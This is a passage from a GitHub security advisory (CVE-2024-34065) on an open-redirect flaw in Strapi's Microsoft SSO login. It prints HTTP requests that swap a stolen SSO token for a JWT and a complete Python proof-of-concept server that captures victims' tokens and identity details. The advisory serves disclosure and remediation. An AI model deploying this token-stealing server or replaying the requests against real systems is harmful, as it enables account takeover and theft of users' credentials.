[![c5](https://private-user-images.githubusercontent.com/30262080/305534553-4da28c5b-6501-4f93-9041-9917a2b070e6.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1Mzg0NjQsIm5iZiI6MTczNjUzODE2NCwicGF0aCI6Ii8zMDI2MjA4MC8zMDU1MzQ1NTMtNGRhMjhjNWItNjUwMS00ZjkzLTkwNDEtOTkxN2EyYjA3MGU2LnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTAlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTEwVDE5NDI0NFomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTkxNTQ0MDQxZmYwY2VlMDU0OTI2N2NlZTgyZDljNmQzMWU2YzMyZTdhNjRlZjEzMjI3OTk5OTIxMjFkMGVhMzQmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.8nf0BVYwaLTcWETXwQu7hQUZQYYRjdUNWPFj5BbhehM)](https://private-user-images.githubusercontent.com/30262080/305534553-4da28c5b-6501-4f93-9041-9917a2b070e6.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1Mzg0NjQsIm5iZiI6MTczNjUzODE2NCwicGF0aCI6Ii8zMDI2MjA4MC8zMDU1MzQ1NTMtNGRhMjhjNWItNjUwMS00ZjkzLTkwNDEtOTkxN2EyYjA3MGU2LnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTAlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTEwVDE5NDI0NFomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTkxNTQ0MDQxZmYwY2VlMDU0OTI2N2NlZTgyZDljNmQzMWU2YzMyZTdhNjRlZjEzMjI3OTk5OTIxMjFkMGVhMzQmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.8nf0BVYwaLTcWETXwQu7hQUZQYYRjdUNWPFj5BbhehM)

The server specially developed by the attacker to show that the vulnerability is exploitable, recovers the user's SSO token.

> Everything is invisible to the victim.

[![c6](https://private-user-images.githubusercontent.com/30262080/305534549-58db0a31-3b3b-4648-958b-953eba88bf87.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1Mzg0NjQsIm5iZiI6MTczNjUzODE2NCwicGF0aCI6Ii8zMDI2MjA4MC8zMDU1MzQ1NDktNThkYjBhMzEtM2IzYi00NjQ4LTk1OGItOTUzZWJhODhiZjg3LnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTAlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTEwVDE5NDI0NFomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTU4ZmE0MzU4ZGM4MTJiOGU1ZmJmMjYxMmFjNjgzZGY0YzdmZjYzYTVmYTBmODc5MjM5ZTlkOTZkM2M5NzEyMjYmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.rkawQzHHNGAoghnYbZd5nIpT1iK0rzznorrNZHe0GUw)](https://private-user-images.githubusercontent.com/30262080/305534549-58db0a31-3b3b-4648-958b-953eba88bf87.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1Mzg0NjQsIm5iZiI6MTczNjUzODE2NCwicGF0aCI6Ii8zMDI2MjA4MC8zMDU1MzQ1NDktNThkYjBhMzEtM2IzYi00NjQ4LTk1OGItOTUzZWJhODhiZjg3LnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTAlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTEwVDE5NDI0NFomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTU4ZmE0MzU4ZGM4MTJiOGU1ZmJmMjYxMmFjNjgzZGY0YzdmZjYzYTVmYTBmODc5MjM5ZTlkOTZkM2M5NzEyMjYmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.rkawQzHHNGAoghnYbZd5nIpT1iK0rzznorrNZHe0GUw)

Because the victim didn't change to another Web page.

[![c7](https://private-user-images.githubusercontent.com/30262080/305534545-ab4dd6f9-02e1-42c9-9142-434db865f0d3.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1Mzg0NjQsIm5iZiI6MTczNjUzODE2NCwicGF0aCI6Ii8zMDI2MjA4MC8zMDU1MzQ1NDUtYWI0ZGQ2ZjktMDJlMS00MmM5LTkxNDItNDM0ZGI4NjVmMGQzLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTAlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTEwVDE5NDI0NFomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWQzZWI1OTM5MTk1YWM1OTlkMzAzNmI2NDUwNzAyZjUyNzBmNzQ5Nzc5YjMyODAxZGY5NDZmNWYwOTlhZjFkMzMmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.Ck0okpW9yUE6-njWOq6lyBY5tfUvGGCwMBUvjxNvmjw)](https://private-user-images.githubusercontent.com/30262080/305534545-ab4dd6f9-02e1-42c9-9142-434db865f0d3.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1Mzg0NjQsIm5iZiI6MTczNjUzODE2NCwicGF0aCI6Ii8zMDI2MjA4MC8zMDU1MzQ1NDUtYWI0ZGQ2ZjktMDJlMS00MmM5LTkxNDItNDM0ZGI4NjVmMGQzLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTAlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTEwVDE5NDI0NFomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWQzZWI1OTM5MTk1YWM1OTlkMzAzNmI2NDUwNzAyZjUyNzBmNzQ5Nzc5YjMyODAxZGY5NDZmNWYwOTlhZjFkMzMmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.Ck0okpW9yUE6-njWOq6lyBY5tfUvGGCwMBUvjxNvmjw)

The attacker can use the SSO token to authenticate himself within the application and retrieve a valid JWT token enabling him to interact with it.

[![c8](https://private-user-images.githubusercontent.com/30262080/305534534-aab8d22f-5f0e-4a67-85a8-2e333df9b84b.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1Mzg0NjQsIm5iZiI6MTczNjUzODE2NCwicGF0aCI6Ii8zMDI2MjA4MC8zMDU1MzQ1MzQtYWFiOGQyMmYtNWYwZS00YTY3LTg1YTgtMmUzMzNkZjliODRiLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTAlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTEwVDE5NDI0NFomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTgxZGI1MGIyMWUyZTQzN2I0MDBmNTlmYjlmZWIzNDFhYTIxMTEwMGY4Yzk1YTY4ZjFmMThlMzZkNDNkZTU4M2ImWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.BUwuz_il3MmQFcXFhf4fSTILF3H9OBc4ualDlyaNIog)](https://private-user-images.githubusercontent.com/30262080/305534534-aab8d22f-5f0e-4a67-85a8-2e333df9b84b.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1Mzg0NjQsIm5iZiI6MTczNjUzODE2NCwicGF0aCI6Ii8zMDI2MjA4MC8zMDU1MzQ1MzQtYWFiOGQyMmYtNWYwZS00YTY3LTg1YTgtMmUzMzNkZjliODRiLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTAlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTEwVDE5NDI0NFomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTgxZGI1MGIyMWUyZTQzN2I0MDBmNTlmYjlmZWIzNDFhYTIxMTEwMGY4Yzk1YTY4ZjFmMThlMzZkNDNkZTU4M2ImWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.BUwuz_il3MmQFcXFhf4fSTILF3H9OBc4ualDlyaNIog)

##### Details

###### Get the JWT token with the `access_token`

First of all, thanks to the SSO token, you authenticate yourself and get a JWT token to be able to interact with the various API routes.

Request (HTTP):

```
GET /api/auth/microsoft/callback?access_token=eyJ0eXAiOiJKV<REDACTED>yBzA HTTP/1.1
Host: <TARGET>

```

Response (HTTP):

```
HTTP/1.1 200 OK
Server: nginx
Date: Mon, 27 Nov 2023 17:58:46 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 411
Connection: keep-alive
Content-Security-Policy: connect-src 'self' https:;img-src 'self' data: blob: https://market-assets.strapi.io;media-src 'self' data: blob:;default-src 'self';base-uri 'self';font-src 'self' https: data:;form-action 'self';frame-ancestors 'self';object-src 'none';script-src 'self';script-src-attr 'none';style-src 'self' https: 'unsafe-inline'
Referrer-Policy: no-referrer
Strict-Transport-Security: max-age=31536000; includeSubDomains
X-Content-Type-Options: nosniff
X-DNS-Prefetch-Control: off
X-Download-Options: noopen
X-Frame-Options: SAMEORIGIN
X-Permitted-Cross-Domain-Policies: none
Vary: Origin
X-XSS-Protection: 1; mode=block
Strict-Transport-Security: max-age=31536000; includeSubDomains
X-Powered-By: <REDACTED>

{"jwt":"eyJhbG<REDACTED>eCac","user":{"id":111,"username":"<REDACTED>@<REDACTED>-ext.com","email":"<redacted>@<redacted>-ext.com","provider":"microsoft","confirmed":true,"blocked":false,"createdAt":"2023-11-14T12:35:42.440Z","updatedAt":"2023-11-16T21:00:19.241Z","is_external":false}}
```
###### Request API routes using the JWT token

Then, as we can see from the request below, we can reuse the JWT token to request the API.

Request (HTTP):

```
GET /api/users/me/groups?app=support HTTP/1.1
Host: <TARGET>
Authorization: Bearer eyJ<REDACTED>EeCac

```

Response (HTTP):

```
HTTP/1.1 200 OK
Server: nginx
Date: Tue, 28 Nov 2023 13:45:42 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 24684
Connection: keep-alive
Content-Security-Policy: connect-src 'self' https:;img-src 'self' data: blob: https://market-assets.strapi.io;media-src 'self' data: blob:;default-src 'self';base-uri 'self';font-src 'self' https: data:;form-action 'self';frame-ancestors 'self';object-src 'none';script-src 'self';script-src-attr 'none';style-src 'self' https: 'unsafe-inline'
Referrer-Policy: no-referrer
Strict-Transport-Security: max-age=31536000; includeSubDomains
X-Content-Type-Options: nosniff
X-DNS-Prefetch-Control: off
X-Download-Options: noopen
X-Frame-Options: SAMEORIGIN
X-Permitted-Cross-Domain-Policies: none
Vary: Origin
X-RateLimit-Limit: 10
X-RateLimit-Remaining: 9
X-RateLimit-Reset: 1701179203
X-XSS-Protection: 1; mode=block
Strict-Transport-Security: max-age=31536000; includeSubDomains
X-Powered-By: <REDACTED>

{"apps":{"support":{"groups":[{"device_whitelist":null,"name":"test - support","id":10,"group_privileges":[{"id":37,<REDACTED>

...
```
### POC (Web server stealing SSO token and retrieving JWT token then bypassing authentication)

```
import base64
import json
import urllib.parse

from http.server import BaseHTTPRequestHandler, HTTPServer
from sys import argv

# Strapi URL.
TARGET = "target.com"

# URLs to which victims are automatically redirected.
REDIRECT_URL = [
    "strapi.io",
    "www.google.fr"
]
# URL used to generate a valid JWT token for authentication within the
# application.
GEN_JWT_URL = f"https://{TARGET}/api/auth/microsoft/callback"

# This function is used to generate a curl command which once executed, will
# give us a valid JWT connection token.
def generate_curl_command(token):
    command = f"curl '{GEN_JWT_URL}?access_token={token}'"
    return command

# We create a custom HTTP server to retrieve users' SSO tokens.
class CustomServer(BaseHTTPRequestHandler):

    # Here we override the default logging function to reduce verbosity.
    def log_message(self, format, *args):
        pass

    # This function automatically redirects a user to the page defined in the
    # global variable linked to the redirection.
    def _set_response(self):
        self.send_response(302)
        self.send_header("Location", REDIRECT_URL[0])
        self.end_headers()

    # If an SSO token is present, we parse it and log the result in STDOUT.
    def do_GET(self):
        # This condition checks whether a token is present in the URL.
        if str(self.path).find("access_token") != -1:
            # If this is the case, we recover the token.
            query = urllib.parse.urlparse(self.path).query
            query_components = dict(qc.split("=") for qc in query.split("&"))
            access_token = urllib.parse.unquote(query_components["access_token"])

            # In the token, which is a string in JWT format, we retrieve the
            # body part of the token.
            interesting_data = access_token.split(".")[1]

            # Patching base64 encoded data.
            interesting_data = interesting_data + "=" * (-len(interesting_data) % 4)

            # Parsing JSON.
            json_data = json.loads(base64.b64decode(interesting_data.encode()))
            family_name, given_name, ipaddr, upn = json_data["given_name"], json_data["family_name"], json_data["ipaddr"], json_data["upn"]

            print(f"[+] Token captured for {family_name} {given_name}, {upn} ({ipaddr}):\n{access_token}\n")
            print(f"[*] Run: \"{generate_curl_command(query_components['access_token'])}\" to get JWT token")

        self._set_response()
        self.wfile.write("Redirecting ...".encode("utf-8"))

def run(server_class=HTTPServer, handler_class=CustomServer, ip="0.0.0.0", port=8080):
    server_address = (ip, port)
    httpd = server_class(server_address, handler_class)

    print(f"Starting httpd ({ip}:{port}) ...")
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        pass

    httpd.server_close()
    print("Stopping httpd ...")

if __name__ == "__main__":
    if len(argv) == 3:
        run(ip=argv[1], port=int(argv[2]))
    else:
        run()
```

### Severity

High

7.1

# CVSS overall score

 This score calculates overall vulnerability severity from 0 to 10 and is based on the Common Vulnerability Scoring System (CVSS).

 / 10

#### CVSS v3 base metrics

Attack vector
Network

Attack complexity
Low

Privileges required
None

User interaction
Required

Scope
Unchanged

Confidentiality
High

Integrity
Low

Availability
None

Learn more about base metrics

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:N

### CVE ID

CVE-2024-34065

### Weaknesses

[CWE-294](/advisories?query=cwe%3A294) [CWE-601](/advisories?query=cwe%3A601)

### Credits

* [![@Eventyret](https://avatars.githubusercontent.com/u/977232?s=40&v=4)](/Eventyret)
  [Eventyret](/Eventyret)
  Analyst
* [![@iarce-qb](https://avatars.githubusercontent.com/u/30262080?s=40&v=4)](/iarce-qb)
  [iarce-qb](/iarce-qb)
  Finder
* [![@derrickmehaffy](https://avatars.githubusercontent.com/u/8593673?s=40&v=4)](/derrickmehaffy)
  [derrickmehaffy](/derrickmehaffy)
  Coordinator
* [![@Convly](https://avatars.githubusercontent.com/u/25851739?s=40&v=4)](/Convly)
  [Convly](/Convly)
  Remediation developer
* [![@innerdvations](https://avatars.githubusercontent.com/u/999278?s=40&v=4)](/innerdvations)
  [innerdvations](/innerdvations)
  Remediation verifier
* [![@alexandrebodin](https://avatars.githubusercontent.com/u/6065744?s=40&v=4)](/alexandrebodin)
  [alexandrebodin](/alexandrebodin)
  Remediation reviewer

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


